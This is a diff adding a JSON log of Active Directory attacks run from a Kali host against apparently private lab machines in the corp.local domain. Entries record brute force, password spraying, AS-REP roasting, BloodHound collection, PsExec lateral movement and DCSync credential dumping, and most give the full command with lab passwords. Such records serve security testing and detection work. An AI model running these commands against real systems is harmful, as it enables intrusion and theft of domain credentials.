@@ -1,0 +1,452 @@
+[
+    {
+        "timestamp": "2026-04-07 15:11:19",
+        "attack_type": "smb_bruteforce",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-07 15:49:55",
+        "attack_type": "psexec",
+        "target": "192.168.56.20"
+    },
+    {
+        "timestamp": "2026-04-07 17:14:11",
+        "attack_type": "rdp_bruteforce",
+        "target": "192.168.56.20"
+    },
+    {
+        "timestamp": "2026-04-12 23:47:25",
+        "attack_type": "psexec",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 00:00:28",
+        "attack_type": "smb_bruteforce",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 00:02:03",
+        "attack_type": "smb_bruteforce",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 00:06:34",
+        "attack_type": "rdp_bruteforce",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 00:10:23",
+        "attack_type": "rdp_bruteforce",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 00:11:50",
+        "attack_type": "rdp_bruteforce",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 00:30:44",
+        "attack_type": "rdp_bruteforce",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 00:35:25",
+        "attack_type": "rdp_bruteforce",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 00:37:24",
+        "attack_type": "smb_bruteforce",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 00:40:47",
+        "attack_type": "smb_bruteforce",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 00:41:04",
+        "attack_type": "rdp_bruteforce",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 00:45:34",
+        "attack_type": "psexec",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 00:47:26",
+        "attack_type": "psexec",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 00:53:39",
+        "attack_type": "psexec",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 10:15:37",
+        "attack_type": "rdp_bruteforce",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-13 14:57:45",
+        "attack_type": "smb_bruteforce",
+        "target": "192.168.56.10"
+    },
+    {
+        "timestamp": "2026-04-26 11:55:47",
+        "attack_type": "evil_winrm_login",
+        "target": "192.168.56.10",
+        "attack_name": "Evil-WinRM Login",
+        "tool": "Evil-WinRM",
+        "category": "Remote Access",
+        "command": "timeout 20 evil-winrm -i 192.168.56.10 -u administrator -p Password123",
+        "exit_status": 124,
+        "duration": 20.17
+    },
+    {
+        "timestamp": "2026-04-26 11:56:46",
+        "attack_type": "asrep_roasting",
+        "target": "192.168.56.10",
+        "attack_name": "AS-REP Roasting",
+        "tool": "Impacket GetNPUsers",
+        "category": "Credential Attack",
+        "command": "impacket-GetNPUsers corp.local/ -usersfile /home/kali/Desktop/attack_lists/users.txt -no-pass -dc-ip 192.168.56.10",
+        "exit_status": 0,
+        "duration": 0.67
+    },
+    {
+        "timestamp": "2026-04-26 12:00:32",
+        "attack_type": "smb_bruteforce",
+        "target": "192.168.56.10",
+        "attack_name": "SMB Brute Force",
+        "tool": "CrackMapExec",
+        "category": "Credential Attack",
+        "command": "crackmapexec smb 192.168.56.10 -u /home/kali/Desktop/attack_lists/users.txt -p /home/kali/Desktop/attack_lists/passwords.txt --continue-on-success",
+        "exit_status": 0,
+        "duration": 1.66
+    },
+    {
+        "timestamp": "2026-04-26 12:14:05",
+        "attack_type": "evil_winrm_login",
+        "target": "192.168.56.20",
+        "attack_name": "Evil-WinRM Login",
+        "tool": "Evil-WinRM",
+        "category": "Remote Access",
+        "command": "timeout 20 evil-winrm -i 192.168.56.20 -u administrator -p Password123",
+        "exit_status": 124,
+        "duration": 20.1
+    },
+    {
+        "timestamp": "2026-04-26 12:19:37",
+        "attack_type": "psexec",
+        "target": "192.168.56.20",
+        "attack_name": "PsExec Remote Execution",
+        "tool": "Impacket PsExec",
+        "category": "Lateral Movement",
+        "command": "impacket-psexec corp.local/administrator:Password123@192.168.56.20",
+        "exit_status": 1,
+        "duration": 30.52
+    },
+    {
+        "timestamp": "2026-04-26 12:27:42",
+        "attack_type": "winrm_bruteforce",
+        "target": "162.168.56.10",
+        "attack_name": "WinRM Brute Force",
+        "tool": "CrackMapExec",
+        "category": "Credential Attack",
+        "command": "bash -lc 'if nc -z -w 5 162.168.56.10 5985; then crackmapexec winrm 162.168.56.10 -u /home/kali/Desktop/attack_lists/users.txt -p /home/kali/Desktop/attack_lists/passwords.txt --continue-on-success; else echo \"[PRECHECK_FAILED] WinRM port 5985 is not reachable on 162.168.56.10\"; exit 2; fi'",
+        "exit_status": 2,
+        "command_status": "Target service precheck failed",
+        "duration": 5.47
+    },
+    {
+        "timestamp": "2026-04-26 12:48:44",
+        "attack_type": "smb_share_enum",
+        "target": "192.168.56.10",
+        "attack_name": "SMB Share Enumeration",
+        "tool": "CrackMapExec",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 445; then crackmapexec smb 192.168.56.10 -u administrator -p Password123 --shares; else echo \"[PRECHECK_FAILED] SMB port 445 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 0,
+        "command_status": "Completed",
+        "duration": 1.28
+    },
+    {
+        "timestamp": "2026-04-27 23:24:27",
+        "attack_type": "smb_share_enum",
+        "target": "192.168.56.10",
+        "attack_name": "SMB Share Enumeration",
+        "tool": "CrackMapExec",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 445; then crackmapexec smb 192.168.56.10 -u administrator -p Password123 --shares; else echo \"[PRECHECK_FAILED] SMB port 445 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 0,
+        "command_status": "Completed",
+        "duration": 2.29
+    },
+    {
+        "timestamp": "2026-05-01 21:16:58",
+        "attack_type": "winrm_bruteforce",
+        "target": "192.168.56.10",
+        "attack_name": "WinRM Brute Force",
+        "tool": "CrackMapExec",
+        "category": "Credential Attack",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 5985; then crackmapexec winrm 192.168.56.10 -u /home/kali/Desktop/attack_lists/users.txt -p /home/kali/Desktop/attack_lists/passwords.txt --continue-on-success; else echo \"[PRECHECK_FAILED] WinRM port 5985 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 0,
+        "command_status": "Completed",
+        "duration": 1.43
+    },
+    {
+        "timestamp": "2026-05-01 21:25:00",
+        "attack_type": "rdp_bruteforce",
+        "target": "192.168.56.10",
+        "attack_name": "RDP Brute Force",
+        "tool": "Hydra",
+        "category": "Credential Attack",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 3389; then hydra -t 4 -V -f -l administrator -P /home/kali/Desktop/attack_lists/passwords.txt rdp://192.168.56.10; else echo \"[PRECHECK_FAILED] RDP port 3389 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 2,
+        "command_status": "Target service precheck failed",
+        "duration": 0.22
+    },
+    {
+        "timestamp": "2026-05-01 21:35:01",
+        "attack_type": "rdp_bruteforce",
+        "target": "192.168.56.10",
+        "attack_name": "RDP Brute Force",
+        "tool": "Hydra",
+        "category": "Credential Attack",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 3389; then hydra -t 4 -V -f -l administrator -P /home/kali/Desktop/attack_lists/passwords.txt rdp://192.168.56.10; else echo \"[PRECHECK_FAILED] RDP port 3389 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 2,
+        "command_status": "Target service precheck failed",
+        "duration": 0.23
+    },
+    {
+        "timestamp": "2026-05-01 21:41:39",
+        "attack_type": "psexec",
+        "target": "192.168.56.10",
+        "attack_name": "PsExec Remote Execution",
+        "tool": "Impacket PsExec",
+        "category": "Lateral Movement",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 445; then impacket-psexec corp.local/administrator:Password123@192.168.56.10; else echo \"[PRECHECK_FAILED] SMB port 445 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 1,
+        "command_status": "Completed with tool error",
+        "duration": 0.43
+    },
+    {
+        "timestamp": "2026-05-02 00:06:31",
+        "attack_type": "dcsync_attempt",
+        "target": "192.168.56.20",
+        "attack_name": "DCSync Attempt",
+        "tool": "Impacket secretsdump",
+        "category": "Credential Access",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.20 445; then impacket-secretsdump corp.local/administrator:Password123@192.168.56.20 -just-dc-user krbtgt; else echo \"[PRECHECK_FAILED] SMB port 445 is not reachable on 192.168.56.20\"; exit 2; fi'",
+        "exit_status": 0,
+        "command_status": "Completed",
+        "duration": 9.46
+    },
+    {
+        "timestamp": "2026-05-02 00:07:23",
+        "attack_type": "bloodhound_collection",
+        "target": "192.168.56.20",
+        "attack_name": "BloodHound Collection",
+        "tool": "bloodhound-python",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.20 389; then bloodhound-python -u administrator -p Password123 -d corp.local -dc DC01.corp.local -ns 192.168.56.20 -c All --zip --dns-tcp --outputdirectory /home/kali/Desktop/bloodhound; else echo \"[PRECHECK_FAILED] LDAP port 389 is not reachable on 192.168.56.20\"; exit 2; fi'",
+        "exit_status": 2,
+        "command_status": "Target service precheck failed",
+        "duration": 0.24
+    },
+    {
+        "timestamp": "2026-05-02 00:23:19",
+        "attack_type": "bloodhound_collection",
+        "target": "192.168.56.20",
+        "attack_name": "BloodHound Collection",
+        "tool": "bloodhound-python",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.20 389; then bloodhound-python -u administrator -p Password123 -d corp.local -dc DC01.corp.local -ns 192.168.56.20 -c All --zip --dns-tcp --outputdirectory /home/kali/Desktop/bloodhound; else echo \"[PRECHECK_FAILED] LDAP port 389 is not reachable on 192.168.56.20\"; exit 2; fi'",
+        "exit_status": 2,
+        "command_status": "Target service precheck failed",
+        "duration": 0.23
+    },
+    {
+        "timestamp": "2026-05-02 00:25:44",
+        "attack_type": "bloodhound_collection",
+        "target": "192.168.56.10",
+        "attack_name": "BloodHound Collection",
+        "tool": "bloodhound-python",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 389; then bloodhound-python -u administrator -p Password123 -d corp.local -dc DC01.corp.local -ns 192.168.56.10 -c All --zip --dns-tcp --outputdirectory /home/kali/Desktop/bloodhound; else echo \"[PRECHECK_FAILED] LDAP port 389 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 2,
+        "command_status": "Completed with tool error",
+        "duration": 0.84
+    },
+    {
+        "timestamp": "2026-05-02 00:32:13",
+        "attack_type": "bloodhound_collection",
+        "target": "192.168.56.10",
+        "attack_name": "BloodHound Collection",
+        "tool": "bloodhound-python",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 389; then cd /home/kali/Desktop && bloodhound-python -u administrator -p Password123 -d corp.local -dc DC01.corp.local -ns 192.168.56.10 -c All --zip --dns-tcp ; else echo \"[PRECHECK_FAILED] LDAP port 389 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 1,
+        "command_status": "Completed with tool error",
+        "duration": 0.63
+    },
+    {
+        "timestamp": "2026-05-02 00:34:45",
+        "attack_type": "bloodhound_collection",
+        "target": "192.168.56.10",
+        "attack_name": "BloodHound Collection",
+        "tool": "bloodhound-python",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 389; then cd /home/kali/Desktop && bloodhound-python -u administrator -p Password123 -d corp.local -dc 192.168.56.10 -ns 192.168.56.10 -c All --zip --dns-tcp ; else echo \"[PRECHECK_FAILED] LDAP port 389 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 1,
+        "command_status": "Completed with tool error",
+        "duration": 0.63
+    },
+    {
+        "timestamp": "2026-05-02 00:36:25",
+        "attack_type": "bloodhound_collection",
+        "target": "192.168.56.10",
+        "attack_name": "BloodHound Collection",
+        "tool": "bloodhound-python",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 389; then cd /home/kali/Desktop && bloodhound-python -u administrator -p Password123 -d corp.local -dc DC01.corp.local -ns 192.168.56.10 -c All --zip --dns-tcp ; else echo \"[PRECHECK_FAILED] LDAP port 389 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 1,
+        "command_status": "Completed with tool error",
+        "duration": 0.63
+    },
+    {
+        "timestamp": "2026-05-02 00:41:30",
+        "attack_type": "bloodhound_collection",
+        "target": "192.168.56.10",
+        "attack_name": "BloodHound Collection",
+        "tool": "bloodhound-python",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 389; then cd /home/kali/Desktop/bloodhound && bloodhound-python -u administrator -p Password123 -d corp.local -dc DC01.corp.local -ns 192.168.56.10 -c All --zip --dns-tcp ; else echo \"[PRECHECK_FAILED] LDAP port 389 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 1,
+        "command_status": "Completed with tool error",
+        "duration": 0.83
+    },
+    {
+        "timestamp": "2026-05-02 00:45:46",
+        "attack_type": "bloodhound_collection",
+        "target": "192.168.56.10",
+        "attack_name": "BloodHound Collection",
+        "tool": "bloodhound-python",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 389; then cd /home/kali/Desktop/bloodhound && bloodhound-python -u administrator -p Password123 -d corp.local -dc DC01.corp.local -ns 192.168.56.10 -c All --zip --dns-tcp ; else echo \"[PRECHECK_FAILED] LDAP port 389 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 1,
+        "command_status": "Completed with tool error",
+        "duration": 0.63
+    },
+    {
+        "timestamp": "2026-05-02 00:50:47",
+        "attack_type": "bloodhound_collection",
+        "target": "192.168.56.10",
+        "attack_name": "BloodHound Collection",
+        "tool": "bloodhound-python",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 389; then cd /home/kali/Desktop/bloodhound && bloodhound-python -u administrator@corp.local -p Soul_Warrior -d corp.local -dc DC01.corp.local -ns 192.168.56.10 -c All --zip --dns-tcp ; else echo \"[PRECHECK_FAILED] LDAP port 389 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 0,
+        "command_status": "Completed",
+        "duration": 1.43
+    },
+    {
+        "timestamp": "2026-05-02 00:52:25",
+        "attack_type": "dcsync_attempt",
+        "target": "192.168.56.10",
+        "attack_name": "DCSync Attempt",
+        "tool": "Impacket secretsdump",
+        "category": "Credential Access",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 445; then impacket-secretsdump corp.local/administrator@corp.local:Soul_Warrior@192.168.56.10 -just-dc-user krbtgt; else echo \"[PRECHECK_FAILED] SMB port 445 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 0,
+        "command_status": "Completed",
+        "duration": 0.42
+    },
+    {
+        "timestamp": "2026-05-02 00:53:58",
+        "attack_type": "ldap_rootdse_enum",
+        "target": "192.168.56.10",
+        "attack_name": "LDAP RootDSE Enumeration",
+        "tool": "ldapsearch",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 389; then ldapsearch -x -H ldap://192.168.56.10 -s base namingcontexts; else echo \"[PRECHECK_FAILED] LDAP port 389 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 0,
+        "command_status": "Completed",
+        "duration": 0.23
+    },
+    {
+        "timestamp": "2026-05-02 00:56:36",
+        "attack_type": "asrep_roasting",
+        "target": "192.168.56.10",
+        "attack_name": "AS-REP Roasting",
+        "tool": "Impacket GetNPUsers",
+        "category": "Credential Attack",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 88; then impacket-GetNPUsers corp.local/ -usersfile /home/kali/Desktop/attack_lists/users.txt -no-pass -dc-ip 192.168.56.10; else echo \"[PRECHECK_FAILED] Kerberos port 88 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 0,
+        "command_status": "Completed",
+        "duration": 0.43
+    },
+    {
+        "timestamp": "2026-05-02 00:57:24",
+        "attack_type": "kerberos_user_enum",
+        "target": "192.168.56.10",
+        "attack_name": "Kerberos User Enumeration",
+        "tool": "Kerbrute",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 88; then kerbrute userenum --dc 192.168.56.10 -d corp.local /home/kali/Desktop/attack_lists/users.txt; else echo \"[PRECHECK_FAILED] Kerberos port 88 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 127,
+        "command_status": "Completed with tool error",
+        "duration": 0.24
+    },
+    {
+        "timestamp": "2026-05-02 01:00:08",
+        "attack_type": "kerberos_user_enum",
+        "target": "192.168.56.10",
+        "attack_name": "Kerberos User Enumeration",
+        "tool": "Kerbrute",
+        "category": "Discovery",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 88; then kerbrute userenum --dc 192.168.56.10 -d corp.local /home/kali/Desktop/attack_lists/users.txt; else echo \"[PRECHECK_FAILED] Kerberos port 88 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 0,
+        "command_status": "Completed",
+        "duration": 0.23
+    },
+    {
+        "timestamp": "2026-05-02 01:00:42",
+        "attack_type": "evil_winrm_login",
+        "target": "192.168.56.10",
+        "attack_name": "WinRM Remote Command",
+        "tool": "CrackMapExec WinRM",
+        "category": "Remote Access",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 5985; then crackmapexec winrm 192.168.56.10 -u administrator@corp.local -p Soul_Warrior -x whoami; else echo \"[PRECHECK_FAILED] WinRM port 5985 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 0,
+        "command_status": "Completed",
+        "duration": 1.23
+    },
+    {
+        "timestamp": "2026-05-02 01:01:20",
+        "attack_type": "smb_password_spray",
+        "target": "192.168.56.10",
+        "attack_name": "SMB Password Spray",
+        "tool": "CrackMapExec",
+        "category": "Credential Attack",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 445; then crackmapexec smb 192.168.56.10 -u /home/kali/Desktop/attack_lists/users.txt -p Soul_Warrior --continue-on-success; else echo \"[PRECHECK_FAILED] SMB port 445 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 0,
+        "command_status": "Completed",
+        "duration": 1.25
+    },
+    {
+        "timestamp": "2026-05-02 13:22:40",
+        "attack_type": "smb_bruteforce",
+        "target": "192.168.56.10",
+        "attack_name": "SMB Brute Force",
+        "tool": "CrackMapExec",
+        "category": "Credential Attack",
+        "command": "bash -lc 'if nc -z -w 5 192.168.56.10 445; then crackmapexec smb 192.168.56.10 -u /home/kali/Desktop/attack_lists/users.txt -p /home/kali/Desktop/attack_lists/passwords.txt --continue-on-success; else echo \"[PRECHECK_FAILED] SMB port 445 is not reachable on 192.168.56.10\"; exit 2; fi'",
+        "exit_status": 0,
+        "command_status": "Completed",
+        "duration": 3.31
+    }
+]
